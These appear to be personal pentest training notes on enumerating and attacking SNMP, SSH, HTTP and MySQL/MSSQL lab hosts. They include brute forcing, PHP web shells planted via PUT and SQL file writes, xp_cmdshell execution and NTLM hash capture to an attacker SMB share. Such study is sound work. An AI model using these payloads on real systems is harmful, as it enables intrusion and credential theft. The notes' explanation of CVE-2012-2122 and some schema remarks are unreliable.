    snmpwalk -v2c -c public 10.129.14.128
	  snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
	  snmpwalk -v 2c -c private  10.129.42.253

  > Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information like in the previous example. Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use onesixtyone and SecLists wordlists or other tools to identify these community strings.
    onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
    onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
    msf> use auxiliary/scanner/snmp/snmp_login
    nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
    hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp

  > Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool crunch(https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists
  > Once we know a community string, we can use it with braa(https://github.com/mteg/braa) to brute-force the individual OIDs and enumerate the information behind them.
    braa <community string>@<IP>:.1.3.6.*   # Syntax
    braa public@10.129.14.128:.1.3.6.*
####SSH
* SSH can also be used to access Windows host and is now native to Windows 10 since version 1809. 
* SSH authentication can be configured in two ways:
	> Username & password authentication
      	> Key based authentication
    	> Examples:
		use auxiliary/scanner/ssh/ssh_version
		ssh 192.168.188.128 22
    		version? 
    		  	nc 192.168.188.128
    		algorithms that can be used to create the key?
    		  	nmap 192.168.188.128 -p22 --script ssh-enum-algos
    		  	ssh -vv 192.168.188.128
    		get ssh server key fingerprint
    		  	nmap 192.168.188.128 -p22 --script ssh-hostkey --script-args ssh_hostkey=full
    		  	ssh-keyscan host | ssh-keygen -lf -
		[+] Auth methods
    			nmap 192.168.188.128 -p22 --script ssh-auth-methods --script-args "ssh.user=admin"
    		[+] Dictionary attack
    		  	nmap 192.168.188.128 -p22 --script ssh-brute --scritp-args userdb=/root/user 
		[+] Metasploit
    		  	auxiliary/scanner/ssh/ssh_login
    		    		set userpass_file /usr/share/wordlist/metasploit/root_userpass.txt
		[+] Other example: We see the reported version is OpenSSH 8.2p1 Ubuntu 4ubuntu0.1. 
			From inspection of other Ubuntu SSH package changelogs(https://launchpad.net/ubuntu/yakkety/+source/openssh/+changelog), we see the release version takes the format 1:7.3p1-1ubuntu0.1. 
			Updating our version to fit this format, we get 1:8.2p1-4ubuntu0.1. 
			In Google ==> '1:8.2p1-4ubuntu0.1 release' ==>  A quick search for this version online reveals that it is included in Ubuntu Linux Focal Fossa 20.04
			In Google ==> 'Ubuntu Linux Focal Fossa 20.04 release date'


####HTTP
* GET /index.html HTTP/1.1 to retrieve the page index.html or GET / HTTP/1.1 to retrieve the default page.
* HTTP is a stateles protocol. Every request is completely unrelated to the ones preceding and following it.
* The cookie jar is the storage space where a web browser stores the cookies. When a web server installs a cookie, it sets the domain field. Then, the browser will use the cookie for every request sent to that domain and all its subdomains. If the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookie host-only flag; this means that the cookie will be sent only to that precise hostname
* -ign_eof
* Websites running PHP install session cookies by using the ==> PHPSESSID, JSP websites use ==> JSESSIONID
* Each development language has its own default session parameter name. Of course, the web developer can also choose to use a custom parameter name
* Session IDs can also be transmitted via GET requests ==> http://example.site/resource.php?sessid=s423ndsd
* Parameter http-only is very important for no access by javascript(document.cookie),java,etc.
* Expires ==> session [expires after close the browser ]
####Fingerprinting with Netcat
* It does not work with encryption
	nc -v www.ferrari.com 80 | GET / HTTP/1.1 Host:www.ferrari.com //Remember that every HTTP request has two empty lines between the header and the body of the reques itself
  	nc -lvnp 8888 (Server) ==> echo 'hello' | nc -v localhost 8888
  	nv example.com 80
  	  HEAD / HTTP/1.0 and hit enter 2 times.
  	  -u : UDP connection
  	  -v : To notify you after the connection to the server
  	  -k : Keep listening after client disconnects
  	  -z: zero I/O

####Fingerprinting with OpenSSL
	openssl s_client -connect hack.me:443 -debug | -state | -quiet and after that OPTIONS HTTP/1.1 Host: hack.me
	openssl x509 -in twitter.com-cert -noout -text
	openssl s_client -connect target.site:443
	HEAD / HTTP/1.0

####Fingerprinting with Httprint
* It uses a signature-based technique to indentify web servers
	httprint -P0 -h <target hosts> -s <signature file>
	-P0 to avoid pinging the host (most web servers do not respond to ping echo requests)

####HTTP methods (Some of them)
* If you use HTTP/1.0, you can skip the Host: header
* OPTIONS (Used to query the web server for enabled HTTP Verbs)
	OPTIONS / HTTP/1.1
    	Host: www.example.site

	curl -X OPTIONS 192.45.178.3 -v

* GET (To request a resource)
	GET /page.php HTTP/1.1 //You can also passa arguments like ==> ... /page.php?course=PTS...
    	Host: www.example.site

    	curl -X GET 192.45.178.3

* POST (To submit HTML form data. POST parameters must be in the message body)
	POST /login.php HTTP/1.1
    	Host: www.example.site

    	username=john&password=mypass

    	curl -X POST 192.45.178.3
    	curl -X POST 192.45.178.3/login.php -d "name=m1l0js&password=m1l0js" -v

* HEAD (Very similar to GET, as it asks just headers of the response instead of the response body)
	HEAD / HTTP/1.1
    	Host: www.example.site

    	curl -I 192.45.178.3
	curl -IL https://www.inlanefreight.com


* PUT (Used to upload a file to the server. It is very dangerous feature if it is allowed and misconfigured)
	PUT /path/to/destination HTTP/1.1
    	Host: www.example.site

    	<PUT data>

    	//You have to know the size of the file you want to upload on the server ==> wc -m payload.php = 20

    	nc victim.site 80
    	PUT /payload.php HTTP/1.0
    	Content-type: text/html
    	Content-length: 20

    	<?php phpinfo(); ?>
    	
    	//Uploading a PHP shell with PUT
    	  nc victim.site 80
    	  PUT /shell.php HTTP/1.0
    	  Content-type: text/html
    	  Content-length: 136 //wc -m shell.php. The code below

    	  <?php
    	  if (isset($_GET['cmd'])) //Runs the following code only if the GET cmd parameter is set
    	  {
    	    $cmd = $_GET['cmd']; //Reads the command to execute
    	    echo '<pre>';
    	    $result = shell_exec($cmd); //Runs the command by using the OS shell
    	    echo $result; //Displays the output of the command
    	    echo '</pre>';
    	  }

    	  [+] In the web browser: victim site/shell.php?cmd=ls


    	curl -X PUT 192.45.178.3
      
* DELETE (Used to remove a file from the server. If misconfigured leads to denial of service and data loss)
	DELETE /path/to/destination HTTP/1.1
    	Host: www.example.site

    	curl -XDELETE 192.45.178.3/uploads/hello.txt


####REST APIs (Representational State Transfer Application Programming Interface)
* Are a specific type of web application that relies strongly on almost all HTTP Verbs. They are often reffered to as 'web services' or simply APIs
* It is sometimes easy to confuse REST APIs PUT method, which simply creates new content with a PUT method that allows us to create an arbitrary file.


####More enumeration
* Gobuster
	> Directory/File enumeration
		gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt 
	> DNS subdomain enumeration
		> Install Seclists
			git clone https://github.com/danielmiessler/SecLists
			sudo apt install seclists -y
		> Add a DNS server such as 1.1.1.1 to the /etc/resolv.conf
		> Launch the attack
			gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
* Checklist
	gobuster
	Web enumeration tips
		banner grabbing / web server headers
		curl
		whatweb
		robots.txt
		source code

* Some common backup file names are:
	.bak
    	.old
    	.txt
    	.xxx
* dirb
	useragentstring.com //Select another if the server checks it
    	dirb http://google.com -a "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0"
    	dirb http://google.com -p http://127.0.0.1:8080 -c "COOKIE:XYZ" //To utilise burpsuite
    	dirb http://google.com -p http://127.0.0.1:8080 -u "admin:password"//To utilise credentials
    	dirb http://google.com -p http://127.0.0.1:8080 -H "MyHeader: My content"//To utilise headers
    	  -R : recursively
	  -a : Specify your custom USER_AGENT
    	  -z : Add a miliseconds delay
    	  -X : Extensions ==> -X ".php,.bak,.txt"
    	  -x : Utilise this extensions

* IIS
	whatweb http://192.127.27.3
      	  X-XSS-Protection[0] //It has no xss protection
      	http 192.127.27.3
      	  files ended in .aspx
      	dirb http://192.127.27.3
      	browsh --startup-url http://192.127.27.3/ //Useful when we don't have a browser to access the target application and we have to use the terminal to access the web application
      	nmap
      	  	http-enum
      	  	http-headers
      	  	nmap 10.2.28.225 -sV -p80 --script http-methods  --script-args http-methods.url-path=/webdav/
      	  	nmap 10.2.28.225 -sV -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/

* Apache
	nmap 10.2.28.225 -p80 -sV --script banner      
      	msfconsole
      	  	use auxiliary/scanner/http/http_version
      	  	use auxiliary/scanner/http/brute_dirs
      	  	use auxiliary/scanner/http/robots_txt
      	curl 192.168.188.126 | more
      	wget "http://192.168.188.126/index"
      	browsh --startup-url http://192.168.188.126
      	lynx http://192.168.188.126 
      	dirb http://192.168.188.126 /usr/share/metasploit-framework/wordlists/directory.txt
####MYSQL
  > MySQL is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the SQL database language. MySQL works according to the client-server principle and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension .sql, for example, like wordpress.sql.
[+] MySQL Clients
  > The MySQL clients can retrieve and edit the data using structured queries to the database engine. Inserting, deleting, modifying, and retrieving data, is done using the SQL database language. Therefore, MySQL is suitable for managing many different databases to which clients can send multiple queries simultaneously. Depending on the use of the database, access is possible via an internal network or the public Internet.
  > One of the best examples of database usage is the CMS WordPress. WordPress stores all created posts, usernames, and passwords in their own database, which is only accessible from the localhost. However, as explained in more detail in the module Introduction to Web Applications, there are database structures that are distributed across multiple servers also

[+] MySQL Databases
  > MySQL is ideally suited for applications such as dynamic websites, where efficient syntax and high response speed are essential. It is often combined with a Linux OS, PHP, and an Apache web server and is also known in this combination as LAMP (Linux, Apache, MySQL, PHP), or when using Nginx, as LEMP. In a web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored. Among these are:
  			
    Headers	                Texts	            Meta tags	        Forms
    Customers	              Usernames	        Administrators	  Moderators
    Email addresses	        User information	Permissions	      Passwords
    External/Internal links	Links to Files	  Specific contents	Values
  > Sensitive data such as passwords can be stored in their plain-text form by MySQL; however, they are generally encrypted beforehand by the PHP scripts using secure methods such as One-Way-Encryption.

[+] Authentication mechanisms
    > MySQL also supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can choose an authentication mode for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.
    > In the past, there was a vulnerability CVE-2012-2122 in MySQL 5.6.x servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the timing attack vulnerability existed in the way MySQL handled authentication attempts.
    > In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure.
    > In the case of MySQL 5.6.x, the server takes longer to respond to an incorrect password than to a correct one. Thus, if we repeatedly try to authenticate with the same incorrect password, we will eventually receive a response indicating that the correct password was found, even though it was not.



[+] MySQL Commands
  > A MySQL database translates the commands internally into executable code and performs the requested actions. The web application informs the user if an error occurs during processing, which various SQL injections can provoke. Often, these error descriptions contain important information and confirm, among other things, that the web application interacts with the database in a different way than the developers intended.

  > The web application sends the generated information back to the client if the data is processed correctly. This information can be the data extracts from a table or records needed for further processing with logins, search functions, etc. SQL commands can display, modify, add or delete rows in tables. In addition, SQL can also change the structure of tables, create or delete relationships and indexes, and manage users.

  > MariaDB, which is often connected with MySQL, is a fork of the original MySQL code. This is because the chief developer of MySQL left the company MySQL AB after it was acquired by Oracle and developed another open-source SQL database management system based on the source code of MySQL and called it MariaDB.

[+] Default Configuration
  > The management of SQL databases and their configurations is a vast topic. It is so large that entire professions, such as database administrator, deal with almost nothing but databases. These structures become very large quickly, and their planning can become complicated. Among other things, DB management is a core competency for software developers but also information security analysts. To cover this area completely would go beyond the scope of this module. Therefore, we recommend setting up a MySQL/MariaDB instance to experiment with the various configurations to understand the available functionality and configuration options better. Let us have a look at the default configuration of MySQL.
    cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
    cat /etc/my.cnf.d/mysql-clients.cnf  #MariaDB

[+] Dangerous settings
  > Many things can be misconfigured with MySQL. We can look in more detail at the MySQL reference to determine which options can be made in the server configuration. The main options that are security-relevant are:
    Settings	        Description
    user	            Sets which user the MySQL service will run as.
    password	        Sets the password for the MySQL user.
    admin_address	    The IP address on which to listen for TCP/IP connections on the administrative network interface.
    debug	            This variable indicates the current debugging settings
    sql_warnings	    This variable controls whether single-row INSERT statements produce an information string if warnings occur.
    secure_file_priv	This variable is used to limit the effect of data import and export operations.

  > The settings user, password, and admin_address are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server. Suppose there are no other security measures to prevent unauthorized access. In that case, the entire database and all the existing customers' information, email addresses, passwords, and personal data can be viewed and even edited.
  > The debug and sql_warnings settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web applications. Accordingly, the SQL injections could be manipulated even to have the MySQL server execute system commands. 

[+] Footprinting the service
  > There are many reasons why a MySQL server could be accessed from an external network. Nevertheless, it is far from being one of the best practices, and we can always find databases that we can reach. Often, these settings were only meant to be temporary but were forgotten by the administrators. This server setup could also be used as a workaround due to a technical problem. Usually, the MySQL server runs on TCP port 3306, and we can scan this port with Nmap to get more detailed information.
    sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

  > Interaction with the MySQL server
    mysql -u root -h 10.129.14.132 #NO password required
    mysql -u root -pP4SSw0rd -h 10.129.14.128

  > If we look at the existing databases, we will see several already exist. The most important databases for the MySQL server are the system schema (sys) and information schema (information_schema). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the reference manual of MySQL ==> (https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes)

  > The information schema is also a database that contains metadata. However, this metadata is mainly retrieved from the system schema database. The reason for the existence of these two is the ANSI/ISO standard that has been established. System schema is a Microsoft system catalog for SQL servers and contains much more information than the information schema
  > Other projects to manage databases ==> https://www.dbcli.com/
  > mycli ==> https://www.mycli.net/config ==> ~/.myclirc 
    mycli -h localhost -u root -D employees -P 3306 
    mycli mysql://root@localhost:3306/employees
    mycli --csv -e "SELECT * FROM employees LIMIT 10" mysql://root@localhost:3306/employees
    #You can add the option -t to display a table.
    * Instead of typing each time the connection credentials to connect to a database, you can create DSN aliases. To do so, you need to modify your config file .mycli under the section [alias_dsn].
        For example:
          [alias_dsn]
          employees = mysql://root@localhost:3306/employees 
          Then you just need to type mycli -d employees to connect to your employees database.
      The command mycli --list-dsn will display the list of DSN aliases you configured.
    * Connecting to Remote Database via SSH
      It’s really easy to connect on a remote database via SSH using openssl.
      First, you need to open a tunnel to your remote server: ssh -Nf <user>@<host> -L 3310:localhost:3306
      Then you can connect to your database simply by using: mycli -h localhost -u <database> -P 3310
        Here’s a concrete example:
            ssh -Nf cooluser@192.168.0.1 -L 3310:localhost:3306
            mycli -h localhost -u cooluser -D employees -P 3310
            Enter the password for the user cooluser
            You’re connected to the database employees!
      Obviously the user cooluser in our example needs to have permissions on the database employees.
    * You can as well execute some special commands, all beginning with \.
       \l - List your databases.
       \u - Use a different database.
       \dt - List tables in the current database.
       \dt+ - Show the created statement used to create the table. Useful to display the structure of the table.
       <sql_query> \G - Display the query result vertically instead of horizontally. I find it very useful: scrolling horizontally is always a bit of a pain.
       \T <format> - Change the output with the format of your choice. Type \T to list all the format available. The default format used is psql.
       \f - List all favorite queries
       \f <name> - Invoke a specific favorite query
       \fs <name> <query> - Save a favorite query
       \fd <name> - Delete a favorite query
    * First thing first, if you want to know what files are in the folder you are, directly from mycli, you can use the command:
        system ls
      The command system can be used with any other shell command. It can be very useful if you need to do some cat or grep on sql files for example. If you want to clear your terminal, just type system clear.
    * If you need to execute a SQL script, you can simply use the command \. filename.
    * Output to a file 
        tee [-o] filename - output everything into a file. Queries, results, everything displayed on your terminal will be written. If the file filename doesn’t exist, it will be created. To overwrite an already existing file, you can use the -o option.
        notee - stop writing the output to a file.
        \o [-o] filename - output the next result only into a file. Again, the -o option is to override a file already existing. However, it seems that this command only work once per session…
    * The command \# will refresh the auto completion in case your new databases / table / alias you just created are not in the result set.
    * A convenient Vim mode is available to be able to navigate in and modify your queries. You can enable it by adding / modifying this line in your config file: key_bindings = vi.
    * You can use the command \e at the end of any query to be able to edit it with your favorite editor, defined thanks to both your $EDITOR and $VISUAL environment variables.
    * Exactly like in your favorite shell, you can search a query you typed before by using the keystroke CTRL + r.
  > Some of the commands we should remember and write down for working with MySQL databases are described below in the table.
    Command	Description
     mycli 
     mysql -u <user> -p<password> -h <IP address>	      Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.
        m1l0js@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
     select version();                                  Show database version
     show databases;	                                  Show all databases.
     use <database>;	                                  Select one of the existing databases.
     show tables;	                                      Show all available tables in the selected database.
     show columns from <table>;	                        Show all columns in the selected database.
     select * from <table>;	                            Show everything in the desired table.
     select * from <table> where <column> = "<string>";	Search for needed string in the desired table.
  > We must know how to interact with different databases. Therefore, we recommend installing and configuring a MySQL server on one of our VMs for experimentation. There is also a widely covered security issues(https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html) section in the reference manual that covers best practices for securing MySQL servers. We should use this when setting up our MySQL server to understand better why something might not work. 
[+] Nmap
	nmap 192.168.188.126 -sV -p 3306
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-empty-password
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-info
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-info //List some capabilities
      	  InteractiveClient
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
      	  datadir
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root', mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
      	nmap 192.168.188.126 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username=root,password=''"


[+] mysql
  InteractiveClient ==> Access through mysql
	mysql -h 192.168.188.126 -u root
    		show databases;
    	  	use books;
    	  	  select count(*) from authors;
    	  	  select * from authors;
    	select load_file("/etc/shadow");
    	use mysql;
    	select user,password from user;
    	//Get a shell with the mysql client user
    	    \! sh
    	mysql -h 192.228.123.3 -u root -e 'show databases';

[+] Read/Change the Database
    > MySQL - Connecting to the SQL Server
        m1l0js@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
    > Sqlcmd - Connecting to the SQL Server
        C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
        ! Note: When we authenticate to MSSQL using sqlcmd we can use the parameters -y (SQLCMDMAXVARTYPEWIDTH) and -Y (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance. 
    > If we are targetting MSSQL from Linux, we can use sqsh as an alternative to sqlcmd: 
        m1l0js@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
        ! Note: When we authenticate to MSSQL using sqsh we can use the parameters -h to disable headers and footers for a cleaner look.
    > Alternatively, we can use the tool from Impacket with the name mssqlclient.py.
        m1l0js@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
    
    > When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use SERVERNAME\\accountname or .\\accountname. The full command would look like:
        m1l0js@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
        
[+] SQL Default Databases
    > MySQL default system schemas/databases:

        + mysql - is the system database that contains tables that store information required by the MySQL server
        + information_schema - provides access to database metadata
        + performance_schema - is a feature for monitoring MySQL Server execution at a low level
        + sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

    > MSSQL default system schemas/databases:

        + master - keeps the information for an instance of SQL Server.
        + msdb - used by SQL Server Agent.
        + model - a template database copied for each new database.
        + resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
        + tempdb - keeps temporary objects for SQL queries.

[+] SQL syntax
    mysql> SHOW DATABASES;
    > If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
        1> SELECT name FROM master.dbo.sysdatabases
        2> GO
    + Select a database
        - MySQL
            mysql> USE htbusers;

        1> USE htbusers
        2> GO
    + Show tables
        mysql> SHOW TABLES;

        1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
        2> GO
    + Select all data from table "users"
        mysql> SELECT * FROM users;

        1> SELECT * FROM users
        2> go
[+] Execute Commands

Command execution is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.

MSSQL has a extended stored procedures(https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called xp_cmdshell(https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about xp_cmdshell:

    - xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management(https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing sp_configure(https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
    - The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account
    - xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed

To execute commands using SQL syntax on MSSQL, use:
    1> xp_cmdshell 'whoami'
    2> GO
    
    > If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
        -- To allow advanced options to be changed.  
        EXECUTE sp_configure 'show advanced options', 1
        GO
        
        -- To update the currently configured value for advanced options.  
        RECONFIGURE
        GO  
        
        -- To enable the feature.  
        EXECUTE sp_configure 'xp_cmdshell', 1
        GO  
        
        -- To update the currently configured value for this feature.  
        RECONFIGURE
        GO
* There are other methods to get command execution, such as adding extended stored procedures(https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), CLR Assemblies(https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), SQL Server Agent Jobs(https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and external scripts(https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.
* MySQL supports User Defined Functions(https://rsc.anu.edu.au/~rsccu/manuals/mySQL/refman-5.0-en.html-chapter/extending-mysql.html#adding-udf) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this GitHub repository(https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.


[+] Write local files
    > MySQL does not have a stored procedure like xp_cmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. Then we can browse to the location where the file is and execute our commands.
    > MySQL - Write Local File 
        mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
    > In MySQL, a global system variable secure_file_priv(https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function(https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file). These operations are permitted only to users who have the FILE(https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
        + secure_file_priv may be set as follows:
            - If empty, the variable has no effect, which is not a secure setting.
            - If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
            - If set to NULL, the server disables import and export operations.
        + In the following example, we can see the secure_file_priv variable is empty, which means we can read and write data using MySQL:
            MySQL - Secure File Privileges
                mysql> show variables like "secure_file_priv";
                +------------------+-------+
                | Variable_name    | Value |
                +------------------+-------+
                | secure_file_priv |       |
                +------------------+-------+
    > To write files using MSSQL, we need to enable Ole Automation Procedures(https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
    > MSSQL - Enable Ole Automation Procedures
        1> sp_configure 'show advanced options', 1
        2> GO
        3> RECONFIGURE
        4> GO
        5> sp_configure 'Ole Automation Procedures', 1
        6> GO
        7> RECONFIGURE
        8> GO

    > MSSQL - Create a File
        1> DECLARE @OLE INT
        2> DECLARE @FileID INT
        3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
        4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
        5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
        6> EXECUTE sp_OADestroy @FileID
        7> EXECUTE sp_OADestroy @OLE
        8> GO

[+] Read Local Files

    > By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
    > Read Local Files in MSSQL
        1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
        2> GO
    > As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
    > MySQL - Read Local Files in MySQL
        mysql> select LOAD_FILE("/etc/passwd");

[+] Capture MSSQL Service Hash
    > In the Attacking SMB section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
    > To make this work, we need first to start Responder(https://github.com/lgandx/Responder) or impacket-smbserver(https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:
    > XP_DIRTREE Hash Stealing
        1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
        2> GO
    > XP_SUBDIRS Hash Stealing
        1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
        2> GO
        ! If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
    > XP_SUBDIRS Hash Stealing with Responder
        m1l0js@htb[/htb]$ sudo responder -I tun0
    > XP_SUBDIRS Hash Stealing with impacket
        m1l0js@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

[+] Impersonate Existing Users with MSSQL
    > SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the IMPERSONATE privilege can lead to privilege escalation in SQL Server.
    > First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
    > Identify Users that We Can Impersonate
        1> SELECT distinct b.name
        2> FROM sys.server_permissions a
        3> INNER JOIN sys.server_principals b
        4> ON a.grantor_principal_id = b.principal_id
        5> WHERE a.permission_name = 'IMPERSONATE'
        6> GO
        
        name
        -----------------------------------------------
        sa
        ben
        valentin
        
        (3 rows affected)
        
        ! To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

    > Verifying our Current User and Role
        1> SELECT SYSTEM_USER
        2> SELECT IS_SRVROLEMEMBER('sysadmin')
        3> go
        
        -----------
        julio                                                                              

        ! As the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the sa user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement EXECUTE AS LOGIN and set it to the user we want to impersonate.
    > Impersonating the SA User
        1> EXECUTE AS LOGIN = 'sa'
        2> SELECT SYSTEM_USER
        3> SELECT IS_SRVROLEMEMBER('sysadmin')
        4> GO
        -----------
        sa
        (1 rows affected)
        
        ! Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.
    > We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.
    > Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.
[+] Communicate with Other Databases with MSSQL
